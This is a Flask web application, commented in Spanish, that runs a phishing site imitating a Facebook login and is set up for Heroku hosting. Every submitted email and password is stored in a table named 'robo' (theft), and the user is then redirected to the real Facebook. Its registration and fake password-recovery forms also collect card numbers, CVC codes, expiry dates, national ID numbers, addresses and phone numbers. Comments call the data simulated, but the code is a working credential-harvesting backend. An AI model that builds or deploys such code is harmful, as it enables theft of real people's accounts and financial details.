import sqlite3
from flask import Flask, render_template, request, redirect, flash

app = Flask(__name__)
app.secret_key = '222'  # Necesaria para usar flash y session

DB_NAME = 'phishing.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    
    # Tabla de usuarios
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS usuario (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nombre TEXT,
            apellido TEXT,
            correo TEXT UNIQUE,
            contrasena TEXT,
            nacimiento TEXT,
            genero TEXT
        )
    ''')

    # Tabla de "robos" de prueba
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS robo (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            correo TEXT,
            contrasena TEXT
        )
    ''')

    # Tabla de info bancaria simulada
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bancario (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nombre TEXT,
            apellido TEXT,
            numero_cuenta TEXT,
            cvc TEXT,
            fecha_vencimiento TEXT
        )
    ''')

    # Tabla de recuperación de contraseña simulada
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS recuperar (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            rut TEXT,
            direccion TEXT,
            correo TEXT,
            telefono TEXT,
            contrasena_anterior TEXT
        )
    ''')

    conn.commit()
    cursor.close()
    conn.close()


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/submit', methods=['POST'])
def submit():
    correo = request.form['correo']
    contrasena = request.form['contrasena']

    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    # Guardar en tabla de prueba "robo"
    cursor.execute('INSERT INTO robo (correo, contrasena) VALUES (?, ?)', (correo, contrasena))
    conn.commit()

    # Revisar si existe en usuarios
    cursor.execute('SELECT contrasena FROM usuario WHERE correo = ?', (correo,))
    result = cursor.fetchone()

    if result:
        if result[0] == contrasena:
            cursor.close()
            conn.close()
            return redirect("https://www.facebook.com/")  # Simulación
        else:
            flash("Contraseña incorrecta.")
            cursor.close()
            conn.close()
            return redirect('/')
    else:
        flash("El correo electrónico o número de móvil que has introducido no está conectado a una cuenta. Encuentra tu cuenta e inicia sesión.")
        cursor.close()
        conn.close()
        return redirect('/')


@app.route('/register', methods=['POST'])
def register():
    # Datos de usuario
    nombre = request.form['nombre']
    apellido = request.form['apellido']
    correo = request.form['correo']
    contrasena = request.form['contrasena']
    nacimiento = request.form['nacimiento']
    genero = request.form['genero']

    # Datos bancarios ficticios
    numero_cuenta = request.form['numero_cuenta']
    cvc = request.form['cvc']
    fecha_vencimiento = request.form['fecha_vencimiento']

    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    # Verificar si ya existe correo
    cursor.execute('SELECT id FROM usuario WHERE correo = ?', (correo,))
    if cursor.fetchone():
        cursor.close()
        conn.close()
        return "Este correo ya está registrado. <a href='/create_account'>Volver</a>"

    # Guardar usuario
    cursor.execute('''
        INSERT INTO usuario (nombre, apellido, correo, contrasena, nacimiento, genero)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (nombre, apellido, correo, contrasena, nacimiento, genero))

    # Guardar info bancaria ficticia
    cursor.execute('''
        INSERT INTO bancario (nombre, apellido, numero_cuenta, cvc, fecha_vencimiento)
        VALUES (?, ?, ?, ?, ?)
    ''', (nombre, apellido, numero_cuenta, cvc, fecha_vencimiento))

    conn.commit()
    cursor.close()
    conn.close()
    return redirect('/')


@app.route('/create_account')
def create_account():
    return render_template('create_account.html')


@app.route('/forgot_password')
def forgot_password():
    return render_template('forgot_password.html')


@app.route('/recover', methods=['POST'])
def recover():
    rut = request.form['rut']
    direccion = request.form['direccion']
    correo = request.form['correo']
    telefono = request.form['telefono']
    contrasena_anterior = request.form['contrasena_anterior']

    # Guardar datos en tabla "recuperar"
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO recuperar (rut, direccion, correo, telefono, contrasena_anterior)
        VALUES (?, ?, ?, ?, ?)
    ''', (rut, direccion, correo, telefono, contrasena_anterior))
    conn.commit()
    cursor.close()
    conn.close()

    # Mostrar mensaje flash debajo del input
    flash("Solicitud enviada. Revisa tu correo electrónico para recuperar tu contraseña.")
    return render_template('forgot_password.html')


if __name__ == '__main__':
    init_db()
    import os
    port = int(os.environ.get("PORT", 5000))  # Puerto que Heroku asigna
    app.run(host="0.0.0.0", port=port, debug=False)
